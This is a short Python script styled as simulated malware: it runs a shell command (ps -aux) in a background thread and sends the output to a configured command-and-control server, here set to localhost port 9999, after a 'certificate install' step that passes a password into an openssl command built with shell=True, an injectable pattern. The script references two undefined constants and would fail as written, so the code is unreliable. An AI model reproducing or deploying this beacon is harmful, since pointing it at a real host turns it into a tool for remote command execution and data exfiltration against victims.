import socket
import subprocess
import threading
import time

# Configuration
C2_SERVER_IP = '127.0.0.1'  # Localhost C2 server
C2_SERVER_PORT = 9999  # C2 server port
LINUX_COMMAND = 'ps -aux'  # Example Linux terminal command

def send_notification(message):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((C2_SERVER_IP, C2_SERVER_PORT))
            s.sendall(message.encode())
            response = s.recv(1024)
            print(f"Server response: {response.decode()}")
    except Exception as e:
        print(f"Failed to send notification: {e}")

def run_linux_command():
    try:
        # Run Linux terminal command in the background
        process = subprocess.Popen(LINUX_COMMAND.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        
        if process.returncode == 0:
            message = f"Linux command executed successfully: {output}"
        else:
            message = f"Linux command failed: {error}"
        
        # Send notification to C2 server
        send_notification(message)
    except Exception as e:
        send_notification(f"Failed to execute Linux command: {e}")

def install_certificate(cert_path, cert_password):
    try:
        # Import the certificate
        command = f"openssl pkcs12 -in {cert_path} -clcerts -nokeys -out /tmp/cert.crt -passin pass:{cert_password}"
        subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(f"Certificate installed successfully from {cert_path}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install certificate: {e.output.decode()}")

def main():
    # Install the certificate
    install_certificate(CERTIFICATE_PATH, CERTIFICATE_PASSWORD)

    # Simulate malware installation delay
    time.sleep(10)
    
    # Start a thread to run Linux command and notify C2 server
    command_thread = threading.Thread(target=run_linux_command)
    command_thread.start()

if __name__ == "__main__":
    main()
            